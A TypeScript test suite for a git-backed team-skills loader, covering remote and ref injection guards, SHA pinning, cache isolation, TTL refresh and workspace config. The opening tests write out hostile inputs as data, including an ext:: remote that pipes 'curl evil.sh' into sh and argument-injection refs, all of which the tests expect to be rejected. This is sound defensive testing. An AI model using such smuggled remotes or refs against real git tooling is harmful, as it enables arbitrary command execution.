import assert from 'node:assert/strict';
import { execFileSync } from 'node:child_process';
import { mkdirSync, mkdtempSync, readFileSync, rmSync, writeFileSync } from 'node:fs';
import { homedir, tmpdir } from 'node:os';
import { join } from 'node:path';
import test, { mock } from 'node:test';
import {
  ensureBareClone,
  getTeamSkillsCached,
  waitForTeamSkills,
  isPinnedSha,
  isSafeRef,
  listRemoteSkills,
  refreshTeamSkills,
  safeRemoteFor,
  sourceIdentity,
} from '../../src/skills-remote.js';
import { provisionedSkillFile, provisionSkills } from '../../src/skills-provision.js';
import { gatedSkillsRepos, projectGatedSkillsRepos } from '../../src/config.js';
import { mergeWriteWorkspaceConfig } from '../../src/workspace/config.js';

// ---- safeRemoteFor: repo/URL injection guard (#428) --------------------------

test('safeRemoteFor rejects the git remote-helper RCE surface', () => {
  // `ext::`/`fd::` transports run arbitrary commands — the headline vector.
  assert.equal(safeRemoteFor("ext::sh -c 'curl evil.sh|sh'"), null);
  assert.equal(safeRemoteFor('fd::17'), null);
  // A leading `-` is argument injection against git's option surface.
  assert.equal(safeRemoteFor('--upload-pack=touch /tmp/pwn'), null);
  assert.equal(safeRemoteFor('-oProxyCommand=evil'), null);
  // Any scheme outside the transport allowlist.
  assert.equal(safeRemoteFor('ftp://evil/x.git'), null);
  assert.equal(safeRemoteFor('javascript://x'), null);
  assert.equal(safeRemoteFor(''), null);
  assert.equal(safeRemoteFor('   '), null);
  // A bare word is neither shorthand, URL, scp-like, nor a path.
  assert.equal(safeRemoteFor('not-a-real-remote'), null);
});

test('safeRemoteFor accepts the documented safe source shapes', () => {
  assert.equal(safeRemoteFor('open-mercato/skills'), 'https://github.com/open-mercato/skills.git');
  assert.equal(safeRemoteFor('https://github.com/o/n.git'), 'https://github.com/o/n.git');
  assert.equal(safeRemoteFor('http://internal.example/n.git'), 'http://internal.example/n.git');
  assert.equal(safeRemoteFor('ssh://git@host/o/n.git'), 'ssh://git@host/o/n.git');
  assert.equal(safeRemoteFor('git@github.com:o/n.git'), 'git@github.com:o/n.git');
  // Local paths / file:// stay working (a documented source shape).
  assert.equal(safeRemoteFor('/abs/path/to/repo'), '/abs/path/to/repo');
  assert.equal(safeRemoteFor('./rel/repo'), './rel/repo');
  assert.equal(safeRemoteFor('../sibling/repo'), '../sibling/repo');
  assert.equal(safeRemoteFor('file:///abs/repo'), 'file:///abs/repo');
  // `.` and `-` are in the owner/name charset, so a single-segment relative
  // path must be matched as a path first, not rewritten to a github.com URL.
  assert.equal(safeRemoteFor('./rel'), './rel');
  assert.equal(safeRemoteFor('../rel'), '../rel');
});

test('safeRemoteFor keeps Windows local paths working (BC §5: local path)', () => {
  // win32 is a supported platform and these worked before the hardening —
  // narrowing the `skillsRepos` source shape would be a breaking change.
  assert.equal(safeRemoteFor('C:\\skills'), 'C:\\skills');
  assert.equal(safeRemoteFor('C:/skills'), 'C:/skills');
  assert.equal(safeRemoteFor('d:\\team\\skills'), 'd:\\team\\skills');
  // Still not a licence for a drive-letter-shaped transport helper.
  assert.equal(safeRemoteFor('C:\\x::y'), null);
});

test('safeRemoteFor expands ~/ so git (no shell) can actually find it', () => {
  // execFile gives git no shell, so a literal `~` would be a directory name.
  assert.equal(safeRemoteFor('~/skills'), join(homedir(), 'skills'));
});

// ---- isSafeRef / isPinnedSha: ref injection guard (#428) ---------------------

test('isSafeRef rejects argument-injection and range refs', () => {
  assert.equal(isSafeRef('--output=/tmp/pwn'), false);
  assert.equal(isSafeRef('-x'), false);
  assert.equal(isSafeRef('main..evil'), false);
  assert.equal(isSafeRef('a b'), false);
  assert.equal(isSafeRef('a;b'), false);
  assert.equal(isSafeRef('$(id)'), false);
  assert.equal(isSafeRef(''), false);
});

test('isSafeRef accepts real branches, tags and SHAs', () => {
  assert.equal(isSafeRef('main'), true);
  assert.equal(isSafeRef('refs/heads/main'), true);
  assert.equal(isSafeRef('release/1.2.3'), true);
  assert.equal(isSafeRef('v1.2.3'), true);
  assert.equal(isSafeRef('a'.repeat(40)), true);
});

test('isPinnedSha recognises full sha-1 and sha-256 commit ids', () => {
  assert.equal(isPinnedSha('0'.repeat(40)), true);
  assert.equal(isPinnedSha('abcdef0123456789'.padEnd(64, '0')), true);
  assert.equal(isPinnedSha('main'), false);
  assert.equal(isPinnedSha('abc'), false); // short sha is not a pin
});

// ---- ensureBareClone refuses unsafe remotes before touching git (#428) -------

test('ensureBareClone throws on an unsafe remote instead of shelling out', async () => {
  await assert.rejects(
    ensureBareClone("ext::sh -c 'touch /tmp/pwn'"),
    /refusing unsafe skills repo remote/,
  );
});

// ---- integration: local clone still works, SHA pins, bad ref degrades --------

test('listRemoteSkills clones a local repo, pins the SHA, and refuses a bad ref', async (t) => {
  const home = mkdtempSync(join(tmpdir(), 'cez-home-'));
  const srcDir = mkdtempSync(join(tmpdir(), 'cez-src-'));
  const prevHome = process.env.HOME;
  process.env.HOME = home; // redirect the ~/.cache/cez skills cache into temp
  t.after(() => {
    if (prevHome === undefined) delete process.env.HOME;
    else process.env.HOME = prevHome;
    rmSync(home, { recursive: true, force: true });
    rmSync(srcDir, { recursive: true, force: true });
  });

  const g = (args: string[]) =>
    execFileSync('git', args, { cwd: srcDir, encoding: 'utf8' }).trim();
  g(['-c', 'init.defaultBranch=main', 'init']);
  g(['config', 'user.email', 'test@example.com']);
  g(['config', 'user.name', 'Test']);
  // A directory skill needs SKILL.md under a `skills/` folder, named after its own directory.
  execFileSync('mkdir', ['-p', join(srcDir, 'greeter')]);
  writeFileSync(join(srcDir, 'greeter', 'SKILL.md'), '---\ndescription: hi\n---\nsay hi\n');
  execFileSync('mkdir', ['-p', join(srcDir, 'skills/greeter')]);
  writeFileSync(join(srcDir, 'skills/greeter', 'SKILL.md'), '---\ndescription: hi\n---\nsay hi\n');
  g(['add', '-A']);
  g(['commit', '-m', 'init']);
  const sha = g(['rev-parse', 'HEAD']);

  await ensureBareClone(srcDir);

  // Branch ref: skills come back and record the resolved commit.
  const onMain = await listRemoteSkills({ repo: srcDir, ref: 'main' });
  const greeter = onMain.find((s) => s.name === 'greeter');
  assert.ok(greeter, 'expected the directory skill to be listed');
  assert.equal(greeter?.team?.commit, sha);

  // Pinned SHA ref: identical result, and the pin is honoured.
  const onSha = await listRemoteSkills({ repo: srcDir, ref: sha });
  assert.ok(onSha.some((s) => s.name === 'greeter'));

  // A wrong pinned SHA resolves to nothing (no HEAD fallback).
  const wrong = await listRemoteSkills({ repo: srcDir, ref: 'f'.repeat(40) });
  assert.deepEqual(wrong, []);

  // An injection ref is refused outright.
  const evil = await listRemoteSkills({ repo: srcDir, ref: '--output=/tmp/pwn' });
  assert.deepEqual(evil, []);
});

// ---- per-project team-skills cache isolation (multi-project workspace, 2.6) --

test('team-skills cache is keyed by repoRoot — projects never see each other\'s skills', async (t) => {
  const home = mkdtempSync(join(tmpdir(), 'cez-home-'));
  const prevHome = process.env.HOME;
  process.env.HOME = home; // redirect the ~/.cache/cez skills cache into temp
  const dirs: string[] = [home];
  t.after(() => {
    if (prevHome === undefined) delete process.env.HOME;
    else process.env.HOME = prevHome;
    for (const d of dirs) rmSync(d, { recursive: true, force: true });
  });

  /** One local skills repo carrying a single directory skill named `name`. */
  const makeSkillsRepo = (name: string): string => {
    const src = mkdtempSync(join(tmpdir(), `cez-src-${name}-`));
    dirs.push(src);
    const g = (args: string[]) => execFileSync('git', args, { cwd: src, encoding: 'utf8' });
    g(['-c', 'init.defaultBranch=main', 'init']);
    g(['config', 'user.email', 'test@example.com']);
    g(['config', 'user.name', 'Test']);
    mkdirSync(join(src, 'skills', name), { recursive: true });
    writeFileSync(join(src, 'skills', name, 'SKILL.md'), `---\ndescription: ${name}\n---\n${name} body\n`);
    g(['add', '-A']);
    g(['commit', '-m', 'init']);
    return src;
  };

  /** One project root whose `.ai/cezar/config.json` points at its own skills repo. */
  const makeProjectRoot = (skillsRepo: string): string => {
    const root = mkdtempSync(join(tmpdir(), 'cez-root-'));
    dirs.push(root);
    mkdirSync(join(root, '.ai/cezar'), { recursive: true });
    writeFileSync(
      join(root, '.ai/cezar', 'config.json'),
      JSON.stringify({ skillsRepos: [{ repo: skillsRepo, ref: 'main' }] }),
    );
    return root;
  };

  const rootA = makeProjectRoot(makeSkillsRepo('alpha-skill'));
  const rootB = makeProjectRoot(makeSkillsRepo('beta-skill'));

  const loadedA = await refreshTeamSkills(rootA);
  const loadedB = await refreshTeamSkills(rootB);
  assert.deepEqual(loadedA.map((s) => s.name), ['alpha-skill']);
  assert.deepEqual(loadedB.map((s) => s.name), ['beta-skill']);

  // The regression: the cache was one module-global list, so after B's load,
  // A's scope was served B's skills. Each root must keep its own entry.
  assert.deepEqual(getTeamSkillsCached(rootA).map((s) => s.name), ['alpha-skill']);
  assert.deepEqual(getTeamSkillsCached(rootB).map((s) => s.name), ['beta-skill']);
});

// ---- passive refresh after the TTL (B19) -------------------------------------

/** A local skills repo, a project root pointing at it, and a mocked `Date`; all undone after `t`. */
function ttlFixture(t: { after: (fn: () => void) => void }) {
  const home = mkdtempSync(join(tmpdir(), 'cez-home-'));
  const src = mkdtempSync(join(tmpdir(), 'cez-src-ttl-'));
  const root = mkdtempSync(join(tmpdir(), 'cez-root-ttl-'));
  const prevHome = process.env.HOME;
  process.env.HOME = home;
  mock.timers.enable({ apis: ['Date'], now: Date.now() });
  t.after(() => {
    mock.timers.reset();
    if (prevHome === undefined) delete process.env.HOME;
    else process.env.HOME = prevHome;
    for (const d of [home, src, root]) rmSync(d, { recursive: true, force: true });
  });
  const g = (args: string[]) => execFileSync('git', args, { cwd: src, encoding: 'utf8' });
  const addSkill = (name: string) => {
    mkdirSync(join(src, name));
    writeFileSync(join(src, name, 'SKILL.md'), `---\ndescription: ${name}\n---\n${name} body\n`);
    g(['add', '-A']);
    g(['commit', '-m', name]);
  };
  g(['-c', 'init.defaultBranch=main', 'init']);
  g(['config', 'user.email', 'test@example.com']);
  g(['config', 'user.name', 'Test']);
  addSkill('first-skill');
  mkdirSync(join(root, '.ai/cezar'), { recursive: true });
  writeFileSync(join(root, '.ai/cezar', 'config.json'), JSON.stringify({ skillsRepos: [{ repo: src, ref: 'main' }] }));
  const names = () => getTeamSkillsCached(root).map((s) => s.name);
  /** Real timers still run: `Date` is the only mocked API. */
  const until = async (predicate: () => boolean) => {
    const deadline = performance.now() + 15_000;
    while (!predicate()) {
      if (performance.now() > deadline) throw new Error('condition not met in time');
      await new Promise((resolve) => setTimeout(resolve, 20));
    }
  };
  return { root, addSkill, names, until };
}

const HOUR = 60 * 60 * 1_000;

test('a passive touch reloads team skills in the background once the last load is older than the six-hour TTL', async (t) => {
  const { root, addSkill, names, until } = ttlFixture(t);
  assert.deepEqual((await waitForTeamSkills(root)).map((s) => s.name), ['first-skill']);
  addSkill('second-skill');

  // A reload reads config.json again; with the source gone it would empty the list.
  const config = join(root, '.ai/cezar/config.json');
  const sources = readFileSync(config, 'utf8');
  writeFileSync(config, JSON.stringify({ skillsRepos: [] }));
  mock.timers.tick(HOUR);
  getTeamSkillsCached(root);
  assert.deepEqual((await waitForTeamSkills(root)).map((s) => s.name), ['first-skill']);
  await new Promise((resolve) => setTimeout(resolve, 500));
  assert.deepEqual(names(), ['first-skill'], 'still fresh: no reload');
  writeFileSync(config, sources);

  mock.timers.tick(5 * HOUR + 1);
  // The TTL reload never blocks a waiter: it answers with the list already held.
  assert.deepEqual((await waitForTeamSkills(root)).map((s) => s.name), ['first-skill']);
  await until(() => names().includes('second-skill'));
  assert.deepEqual(names(), ['first-skill', 'second-skill']);
});

test('the TTL and the fetch time share one clock, so a slow load does not stretch the interval', async (t) => {
  const { root, addSkill, names, until } = ttlFixture(t);
  const first = waitForTeamSkills(root);
  // The first load is still cloning when a minute passes.
  mock.timers.tick(60 * 1_000);
  assert.deepEqual((await first).map((s) => s.name), ['first-skill']);
  addSkill('second-skill');

  mock.timers.tick(6 * HOUR);
  getTeamSkillsCached(root);
  await until(() => names().includes('second-skill'));
});

test('a team skill path is named only after this process materialized it, and while it holds that blob', async (t) => {
  const { root, names, until } = ttlFixture(t);
  await waitForTeamSkills(root);
  await until(() => names().includes('first-skill'));
  const skill = getTeamSkillsCached(root).find((s) => s.name === 'first-skill')!;
  const cwd = mkdtempSync(join(tmpdir(), 'cez-team-cwd-'));
  t.after(() => rmSync(cwd, { recursive: true, force: true }));
  const file = join(cwd, '.claude/skills/first-skill/SKILL.md');

  // A same-named entry cezar did not write: never named.
  mkdirSync(join(cwd, '.claude/skills/first-skill'), { recursive: true });
  writeFileSync(file, '---\nname: first-skill\n---\nsomething else\n');
  assert.equal(provisionedSkillFile(cwd, skill), undefined);

  assert.deepEqual(await provisionSkills(cwd, [skill], [skill]), ['first-skill']);
  assert.equal(provisionedSkillFile(cwd, skill), file);

  // Edited after materialization: no longer the team blob.
  writeFileSync(file, '---\nname: first-skill\n---\nedited\n');
  assert.equal(provisionedSkillFile(cwd, skill), undefined);
});

test('a failed re-materialization over an earlier success inlines the team skill', async (t) => {
  const { root, names, until } = ttlFixture(t);
  await waitForTeamSkills(root);
  await until(() => names().includes('first-skill'));
  const skill = getTeamSkillsCached(root).find((s) => s.name === 'first-skill')!;
  const cwd = mkdtempSync(join(tmpdir(), 'cez-team-cwd-'));
  t.after(() => rmSync(cwd, { recursive: true, force: true }));
  assert.deepEqual(await provisionSkills(cwd, [skill], [skill]), ['first-skill']);
  assert.equal(provisionedSkillFile(cwd, skill), join(cwd, '.claude/skills/first-skill/SKILL.md'));

  // A pinned commit the clone does not have: the copy on disk is unchanged, but this materialization failed.
  const gone = { ...skill, team: { ...skill.team!, ref: 'f'.repeat(40) } };
  assert.deepEqual(await provisionSkills(cwd, [gone], [gone]), []);
  assert.equal(provisionedSkillFile(cwd, skill), undefined);
});

// ---- organisation skills repos from the workspace config (Global settings) ----

test('workspace org skills repos join every project\'s team skills; invalidation re-reads them', async (t) => {
  const home = mkdtempSync(join(tmpdir(), 'cez-home-'));
  const prevHome = process.env.HOME;
  const prevCez = process.env.CEZ_HOME;
  process.env.HOME = home;
  process.env.CEZ_HOME = join(home, '.cezar');
  const dirs: string[] = [home];
  t.after(() => {
    if (prevHome === undefined) delete process.env.HOME;
    else process.env.HOME = prevHome;
    if (prevCez === undefined) delete process.env.CEZ_HOME;
    else process.env.CEZ_HOME = prevCez;
    for (const d of dirs) rmSync(d, { recursive: true, force: true });
  });

  const src = mkdtempSync(join(tmpdir(), 'cez-src-org-'));
  dirs.push(src);
  const g = (args: string[]) => execFileSync('git', args, { cwd: src, encoding: 'utf8' });
  g(['-c', 'init.defaultBranch=main', 'init']);
  g(['config', 'user.email', 'test@example.com']);
  g(['config', 'user.name', 'Test']);
  mkdirSync(join(src, 'skills/org-skill'), { recursive: true });
  writeFileSync(join(src, 'skills/org-skill', 'SKILL.md'), '---\ndescription: org\n---\norg body\n');
  g(['add', '-A']);
  g(['commit', '-m', 'init']);

  const root = mkdtempSync(join(tmpdir(), 'cez-root-'));
  dirs.push(root);
  mkdirSync(join(root, '.ai/cezar'), { recursive: true });
  writeFileSync(join(root, '.ai/cezar', 'config.json'), JSON.stringify({ skillsRepos: [] }));

  assert.deepEqual((await refreshTeamSkills(root)).map((s) => s.name), []);

  await mergeWriteWorkspaceConfig((config) => {
    config.orgSkillsRepos = [{ repo: src, ref: 'main' }];
  });
  assert.deepEqual((await refreshTeamSkills(root)).map((s) => s.name), ['org-skill']);

  // Another process changing the shared config must reach this process's cache without a callback.
  assert.deepEqual((await waitForTeamSkills(root)).map((s) => s.name), ['org-skill']);
  await mergeWriteWorkspaceConfig((config) => {
    delete config.orgSkillsRepos;
  });
  assert.deepEqual((await waitForTeamSkills(root)).map((s) => s.name), []);
  await mergeWriteWorkspaceConfig((config) => {
    config.orgSkillsRepos = [{ repo: src, ref: 'main' }];
  });

  // An entry written by a newer cezar keeps its unknown keys through an unrelated merge-write.
  const file = join(home, '.cezar', 'config.json');
  const raw = JSON.parse(readFileSync(file, 'utf8'));
  raw.orgSkillsRepos[0].future = 'kept';
  writeFileSync(file, JSON.stringify(raw));
  await mergeWriteWorkspaceConfig((config) => {
    config.browseRoot = '~/';
  });
  assert.equal(JSON.parse(readFileSync(file, 'utf8')).orgSkillsRepos[0].future, 'kept');

  // A hand-edited config past the PUT bounds is trimmed, one bad row never evicts the rest.
  const big = JSON.parse(readFileSync(file, 'utf8'));
  big.orgSkillsRepos = [
    { repo: 'x'.repeat(501) },
    ...Array.from({ length: 30 }, (_, i) => ({ repo: `acme/s${i}` })),
  ];
  writeFileSync(file, JSON.stringify(big));
  const { loadWorkspaceConfig } = await import('../../src/workspace/config.js');
  assert.equal((await loadWorkspaceConfig()).orgSkillsRepos?.length, 20);
});

test('skillsDirOnly: only files under a skills/ folder are skills, at any depth', async (t) => {
  const home = mkdtempSync(join(tmpdir(), 'cez-home-'));
  const prevHome = process.env.HOME;
  process.env.HOME = home;
  const src = mkdtempSync(join(tmpdir(), 'cez-src-depth-'));
  t.after(() => {
    if (prevHome === undefined) delete process.env.HOME;
    else process.env.HOME = prevHome;
    rmSync(home, { recursive: true, force: true });
    rmSync(src, { recursive: true, force: true });
  });
  const g = (args: string[]) => execFileSync('git', args, { cwd: src, encoding: 'utf8' });
  g(['-c', 'init.defaultBranch=main', 'init']);
  g(['config', 'user.email', 'test@example.com']);
  g(['config', 'user.name', 'Test']);
  const put = (path: string, body = 'body\n') => {
    mkdirSync(join(src, path, '..'), { recursive: true });
    writeFileSync(join(src, path), body);
  };
  put('README.md', '# repo\n');
  put('commands/README.md');
  put('commands/deploy.md');
  put('docs/guide.md');
  put('SKILL.md');
  put('tools/lint/SKILL.md'); // no skills/ ancestor
  put('skills/alpha/SKILL.md');
  put('skills/alpha/references/notes.md'); // belongs to alpha
  put('a/b/skills/c/beta/SKILL.md'); // nested skills folder
  put('.ai/skills/flat.md', '---\nname: flat-one\n---\nx\n');
  g(['add', '-A']);
  g(['commit', '-m', 'init']);
  await ensureBareClone(src);
  const strict = await listRemoteSkills({ repo: src, ref: 'main' }, { skillsDirOnly: true });
  assert.deepEqual(strict.map((s) => s.name).sort(), ['alpha', 'beta', 'flat-one']);
  // The default discovery stays additive (BACKWARD_COMPATIBILITY §5): legacy layouts still load.
  const legacy = (await listRemoteSkills({ repo: src, ref: 'main' })).map((s) => s.name);
  for (const name of ['alpha', 'beta', 'lint', 'deploy', 'README']) assert.ok(legacy.includes(name), name);
});

test('an org entry for the implicit default repo overrides its ref, and ungates it', async (t) => {
  const home = mkdtempSync(join(tmpdir(), 'cez-home-'));
  const prevCez = process.env.CEZ_HOME;
  process.env.CEZ_HOME = join(home, '.cezar');
  const root = mkdtempSync(join(tmpdir(), 'cez-root-'));
  t.after(() => {
    if (prevCez === undefined) delete process.env.CEZ_HOME;
    else process.env.CEZ_HOME = prevCez;
    rmSync(home, { recursive: true, force: true });
    rmSync(root, { recursive: true, force: true });
  });
  const before = await gatedSkillsRepos(root);
  assert.ok(before.has('open-mercato/skills'));
  await mergeWriteWorkspaceConfig((config) => {
    config.orgSkillsRepos = [{ repo: 'open-mercato/skills', ref: 'v1' }];
  });
  assert.equal((await gatedSkillsRepos(root)).has('open-mercato/skills'), false);
});

test('implicit default is detected like loadConfig: an invalid skillsRepos is not explicit', async (t) => {
  const home = mkdtempSync(join(tmpdir(), 'cez-home-'));
  const prevCez = process.env.CEZ_HOME;
  process.env.CEZ_HOME = join(home, '.cezar');
  const root = mkdtempSync(join(tmpdir(), 'cez-root-'));
  t.after(() => {
    if (prevCez === undefined) delete process.env.CEZ_HOME;
    else process.env.CEZ_HOME = prevCez;
    rmSync(home, { recursive: true, force: true });
    rmSync(root, { recursive: true, force: true });
  });
  mkdirSync(join(root, '.ai/cezar'), { recursive: true });
  const cfg = join(root, '.ai/cezar', 'config.json');
  writeFileSync(cfg, JSON.stringify({ skillsRepos: 'nonsense' }));
  assert.ok((await projectGatedSkillsRepos(root)).has('open-mercato/skills'));
  writeFileSync(cfg, JSON.stringify({ skillsRepos: [{ repo: 'acme/skills' }] }));
  assert.equal((await projectGatedSkillsRepos(root)).size, 0);
});

test('a project listing one repo at two refs keeps both; org repos only drop duplicates by identity', async (t) => {
  const home = mkdtempSync(join(tmpdir(), 'cez-home-'));
  const prevHome = process.env.HOME;
  const prevCez = process.env.CEZ_HOME;
  process.env.HOME = home;
  process.env.CEZ_HOME = join(home, '.cezar');
  const dirs: string[] = [home];
  t.after(() => {
    if (prevHome === undefined) delete process.env.HOME;
    else process.env.HOME = prevHome;
    if (prevCez === undefined) delete process.env.CEZ_HOME;
    else process.env.CEZ_HOME = prevCez;
    for (const d of dirs) rmSync(d, { recursive: true, force: true });
  });
  const src = mkdtempSync(join(tmpdir(), 'cez-src-refs-'));
  dirs.push(src);
  const g = (args: string[]) => execFileSync('git', args, { cwd: src, encoding: 'utf8' });
  g(['-c', 'init.defaultBranch=main', 'init']);
  g(['config', 'user.email', 'test@example.com']);
  g(['config', 'user.name', 'Test']);
  mkdirSync(join(src, 'skills/base'), { recursive: true });
  writeFileSync(join(src, 'skills/base', 'SKILL.md'), 'base\n');
  g(['add', '-A']);
  g(['commit', '-m', 'base']);
  g(['branch', 'next']);
  g(['checkout', '-q', 'next']);
  mkdirSync(join(src, 'skills/only-next'), { recursive: true });
  writeFileSync(join(src, 'skills/only-next', 'SKILL.md'), 'next\n');
  g(['add', '-A']);
  g(['commit', '-m', 'next']);

  const root = mkdtempSync(join(tmpdir(), 'cez-root-'));
  dirs.push(root);
  mkdirSync(join(root, '.ai/cezar'), { recursive: true });
  writeFileSync(
    join(root, '.ai/cezar', 'config.json'),
    JSON.stringify({ skillsRepos: [{ repo: src, ref: 'main' }, { repo: src, ref: 'next' }] }),
  );
  const names = (await refreshTeamSkills(root)).map((s) => s.name).sort();
  assert.deepEqual(names, ['base', 'only-next']);
});

test('sourceIdentity folds GitHub case and spelling, but not local paths', () => {
  assert.equal(sourceIdentity('Acme/Skills'), sourceIdentity('acme/skills'));
  assert.equal(sourceIdentity('https://github.com/Acme/Skills.git'), sourceIdentity('acme/skills'));
  assert.equal(sourceIdentity('git@github.com:Acme/Skills.git'), sourceIdentity('acme/skills'));
  assert.notEqual(sourceIdentity('/tmp/Org/Skills'), sourceIdentity('/tmp/org/skills'));
});
